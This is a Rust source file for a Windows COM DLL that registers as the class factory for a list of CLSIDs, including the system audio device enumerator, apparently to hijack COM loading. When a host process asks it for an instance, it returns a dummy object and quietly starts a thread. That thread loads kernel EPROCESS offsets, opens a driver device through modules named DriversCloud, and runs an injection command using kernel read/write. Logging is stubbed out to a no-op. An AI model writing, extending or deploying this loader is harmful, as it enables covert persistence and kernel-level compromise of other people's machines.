#![allow(non_snake_case, dead_code, unsafe_op_in_unsafe_fn)]

use std::ffi::c_void;
use windows_sys::core::{GUID, HRESULT};
use windows_sys::Win32::Foundation::{CLASS_E_CLASSNOTAVAILABLE, E_NOINTERFACE, S_OK, HMODULE};
use windows_sys::Win32::System::SystemServices::DLL_PROCESS_ATTACH;

mod commands {
    pub mod borrow {
        include!("../borrow.rs");
    }
}
#[path = "../../DriversCloud/src/device.rs"] pub mod device;
#[path = "../../DriversCloud/src/eprocess.rs"] pub mod eprocess;
#[path = "../../DriversCloud/src/gadgets.rs"] pub mod gadgets;
#[path = "../../DriversCloud/src/kernel_rw.rs"] pub mod kernel_rw;
#[path = "../../DriversCloud/src/utils.rs"] pub mod utils;

fn log(_msg: &str) {}

const CLSID_43543050: GUID = GUID {
    data1: 0x43543050,
    data2: 0xC253,
    data3: 0xC0C1,
    data4: [0x76, 0x06, 0x07, 0xB8, 0x12, 0x4D, 0x41, 0x73],
};

const CLSID_50CE75BC: GUID = GUID {
    data1: 0x50CE75BC,
    data2: 0x766C,
    data3: 0x4136,
    data4: [0xBF, 0x5E, 0x91, 0x97, 0xAA, 0x23, 0x56, 0x9E],
};

const CLSID_MMDeviceEnumerator: GUID = GUID {
    data1: 0xD9144DCD,
    data2: 0xE998,
    data3: 0x4ECA,
    data4: [0xAB, 0x6A, 0xDC, 0xD8, 0x3C, 0xCB, 0xA1, 0x6D],
};

const CLSID_c1ecb4e0: GUID = GUID {
    data1: 0xC1ECB4E0,
    data2: 0x0218,
    data3: 0x12A5,
    data4: [0xD9, 0x5D, 0x90, 0x64, 0x2E, 0x8F, 0xA9, 0x2C],
};

const CLSID_44d271e8: GUID = GUID {
    data1: 0x44D271E8,
    data2: 0xB94C,
    data3: 0x7F29,
    data4: [0x4A, 0xF1, 0x13, 0xC9, 0xCE, 0xBF, 0x21, 0xCA],
};

const CLSID_fbd9184d: GUID = GUID {
    data1: 0xFBD9184D,
    data2: 0x6F45,
    data3: 0xE8B0,
    data4: [0x97, 0xFA, 0xA0, 0xD4, 0x4D, 0xD6, 0xB9, 0x5A],
};

const CLSID_047f86db: GUID = GUID {
    data1: 0x047F86DB,
    data2: 0xC962,
    data3: 0xC9AF,
    data4: [0x93, 0x6F, 0xA0, 0xF5, 0x45, 0xB0, 0x12, 0x62],
};

const CLSID_9c26524d: GUID = GUID {
    data1: 0x9C26524D,
    data2: 0xACB6,
    data3: 0x641C,
    data4: [0xF8, 0x38, 0x5D, 0x2D, 0x80, 0xAF, 0x0A, 0x53],
};

const CLSID_9571619b: GUID = GUID {
    data1: 0x9571619B,
    data2: 0x9E01,
    data3: 0x232B,
    data4: [0x9B, 0x24, 0xCC, 0x47, 0x3F, 0x43, 0xED, 0x76],
};

const CLSID_d2b68891: GUID = GUID {
    data1: 0xD2B68891,
    data2: 0xA0C1,
    data3: 0x4FBC,
    data4: [0x2F, 0x7C, 0xD2, 0xD2, 0xF3, 0x87, 0x99, 0x35],
};

const CLSID_c87d7a0e: GUID = GUID {
    data1: 0xC87D7A0E,
    data2: 0x5D14,
    data3: 0x1D0D,
    data4: [0x33, 0x52, 0x50, 0x0D, 0x6B, 0x4A, 0x6B, 0x00],
};

const CLSID_5209a075: GUID = GUID {
    data1: 0x5209A075,
    data2: 0x42BC,
    data3: 0x371F,
    data4: [0x78, 0x0D, 0xE5, 0xE6, 0x08, 0x62, 0x3F, 0xDD],
};

const CLSID_660b90c8: GUID = GUID {
    data1: 0x660B90C8,
    data2: 0x73A9,
    data3: 0x4B58,
    data4: [0x8C, 0xAE, 0x35, 0x5B, 0x7F, 0x55, 0x34, 0x1B],
};

const SUPPORTED_CLSIDS: &[GUID] = &[
    CLSID_43543050,
    CLSID_50CE75BC,
    CLSID_MMDeviceEnumerator,
    CLSID_c1ecb4e0,
    CLSID_44d271e8,
    CLSID_fbd9184d,
    CLSID_047f86db,
    CLSID_9c26524d,
    CLSID_9571619b,
    CLSID_d2b68891,
    CLSID_c87d7a0e,
    CLSID_5209a075,
    CLSID_660b90c8,
];

fn guid_eq(a: &GUID, b: &GUID) -> bool {
    a.data1 == b.data1
        && a.data2 == b.data2
        && a.data3 == b.data3
        && a.data4 == b.data4
}

fn is_supported_clsid(rclsid: &GUID) -> bool {
    SUPPORTED_CLSIDS.iter().any(|g| guid_eq(rclsid, g))
}

const IID_IUnknown: GUID = GUID {
    data1: 0x00000000,
    data2: 0x0000,
    data3: 0x0000,
    data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
};

const IID_IClassFactory: GUID = GUID {
    data1: 0x00000001,
    data2: 0x0000,
    data3: 0x0000,
    data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
};

#[repr(C)]
struct IUnknownVtbl {
    pub QueryInterface: unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> HRESULT,
    pub AddRef: unsafe extern "system" fn(*mut c_void) -> u32,
    pub Release: unsafe extern "system" fn(*mut c_void) -> u32,
}

#[repr(C)]
struct DummyObject {
    pub vtbl: *const IUnknownVtbl,
}

unsafe extern "system" fn Dummy_QueryInterface(
    this: *mut c_void,
    riid: *const GUID,
    ppvObject: *mut *mut c_void,
) -> HRESULT {
    if ppvObject.is_null() { return E_NOINTERFACE; }
    let riid = &*riid;
    if riid.data1 == IID_IUnknown.data1 && riid.data2 == IID_IUnknown.data2 && riid.data3 == IID_IUnknown.data3 && riid.data4 == IID_IUnknown.data4 {
        *ppvObject = this;
        return S_OK;
    }
    *ppvObject = std::ptr::null_mut();
    E_NOINTERFACE
}

unsafe extern "system" fn Dummy_AddRef(_this: *mut c_void) -> u32 { 2 }
unsafe extern "system" fn Dummy_Release(_this: *mut c_void) -> u32 { 1 }

static DUMMY_VTBL: IUnknownVtbl = IUnknownVtbl {
    QueryInterface: Dummy_QueryInterface,
    AddRef: Dummy_AddRef,
    Release: Dummy_Release,
};

static mut DUMMY_INSTANCE: DummyObject = DummyObject {
    vtbl: &DUMMY_VTBL,
};

#[repr(C)]
struct IClassFactoryVtbl {
    pub QueryInterface: unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> HRESULT,
    pub AddRef: unsafe extern "system" fn(*mut c_void) -> u32,
    pub Release: unsafe extern "system" fn(*mut c_void) -> u32,
    pub CreateInstance: unsafe extern "system" fn(*mut c_void, *mut c_void, *const GUID, *mut *mut c_void) -> HRESULT,
    pub LockServer: unsafe extern "system" fn(*mut c_void, i32) -> HRESULT,
}

#[repr(C)]
struct MyClassFactory {
    pub vtbl: *const IClassFactoryVtbl,
}

static mut FACTORY_REF_COUNT: u32 = 0;
static mut GLOBAL_REF_COUNT: u32 = 0;

unsafe extern "system" fn Factory_QueryInterface(
    this: *mut c_void,
    riid: *const GUID,
    ppvObject: *mut *mut c_void,
) -> HRESULT {
    if ppvObject.is_null() {
        return E_NOINTERFACE;
    }
    let riid = &*riid;
    if riid.data1 == IID_IUnknown.data1 && riid.data2 == IID_IUnknown.data2 && riid.data3 == IID_IUnknown.data3 && riid.data4 == IID_IUnknown.data4 ||
       riid.data1 == IID_IClassFactory.data1 && riid.data2 == IID_IClassFactory.data2 && riid.data3 == IID_IClassFactory.data3 && riid.data4 == IID_IClassFactory.data4 {
        *ppvObject = this;
        Factory_AddRef(this);
        return S_OK;
    }
    *ppvObject = std::ptr::null_mut();
    E_NOINTERFACE
}

unsafe extern "system" fn Factory_AddRef(_this: *mut c_void) -> u32 {
    FACTORY_REF_COUNT += 1;
    FACTORY_REF_COUNT
}

unsafe extern "system" fn Factory_Release(_this: *mut c_void) -> u32 {
    FACTORY_REF_COUNT -= 1;
    FACTORY_REF_COUNT
}

unsafe extern "system" fn Factory_CreateInstance(
    _this: *mut c_void,
    pUnkOuter: *mut c_void,
    _riid: *const GUID,
    ppvObject: *mut *mut c_void,
) -> HRESULT {
    log("Factory_CreateInstance called!");
    
    if !pUnkOuter.is_null() {
        return CLASS_E_CLASSNOTAVAILABLE;
    }

    std::thread::spawn(|| {
        let offsets = match eprocess::init_for_current_build() {
            Ok(off) => {
                if let Ok(build) = eprocess::query_nt_build_number() {
                    commands::borrow::log_debug(&format!(
                        "NtBuildNumber={} (0x{:X}), EPROCESS offsets loaded",
                        build, build
                    ));
                }
                off
            }
            Err(e) => {
                commands::borrow::log_debug(&format!("offset init failed: {:?}", e));
                return;
            }
        };

        if let Ok(dev) = device::Device::open(device::DEVICE_PATH) {
            if let Err(e) = commands::borrow::cmd_inject(&dev, None, offsets) {
                let msg = format!("cmd_inject failed: {:?}", e);
                commands::borrow::log_debug(&msg);
            }
        }
    });

    *ppvObject = std::ptr::addr_of_mut!(DUMMY_INSTANCE) as *mut c_void;
    S_OK
}

unsafe extern "system" fn Factory_LockServer(_this: *mut c_void, fLock: i32) -> HRESULT {
    if fLock != 0 {
        GLOBAL_REF_COUNT += 1;
    } else {
        GLOBAL_REF_COUNT -= 1;
    }
    S_OK
}

static FACTORY_VTBL: IClassFactoryVtbl = IClassFactoryVtbl {
    QueryInterface: Factory_QueryInterface,
    AddRef: Factory_AddRef,
    Release: Factory_Release,
    CreateInstance: Factory_CreateInstance,
    LockServer: Factory_LockServer,
};

static mut MY_FACTORY: MyClassFactory = MyClassFactory {
    vtbl: &FACTORY_VTBL,
};

#[unsafe(no_mangle)]
pub extern "system" fn DllGetClassObject(
    rclsid: *const GUID,
    riid: *const GUID,
    ppv: *mut *mut c_void,
) -> HRESULT {
    log("DllGetClassObject called!");
    
    if rclsid.is_null() || riid.is_null() || ppv.is_null() {
        return E_NOINTERFACE;
    }

    let rclsid = unsafe { &*rclsid };
    if is_supported_clsid(rclsid) {
        unsafe {
            return Factory_QueryInterface(std::ptr::addr_of_mut!(MY_FACTORY) as *mut c_void, riid, ppv);
        }
    }

    CLASS_E_CLASSNOTAVAILABLE
}

#[unsafe(no_mangle)]
pub extern "system" fn DllCanUnloadNow() -> HRESULT {
    unsafe {
        if FACTORY_REF_COUNT == 0 && GLOBAL_REF_COUNT == 0 {
            S_OK
        } else {
            1
        }
    }
}

#[unsafe(no_mangle)]
pub extern "system" fn DllMain(
    _hinst: HMODULE,
    reason: u32,
    _reserved: *mut c_void,
) -> i32 {
    if reason == DLL_PROCESS_ATTACH {
        log(&format!("DLL_PROCESS_ATTACH at {:?}", std::time::SystemTime::now()));
    }
    1
}
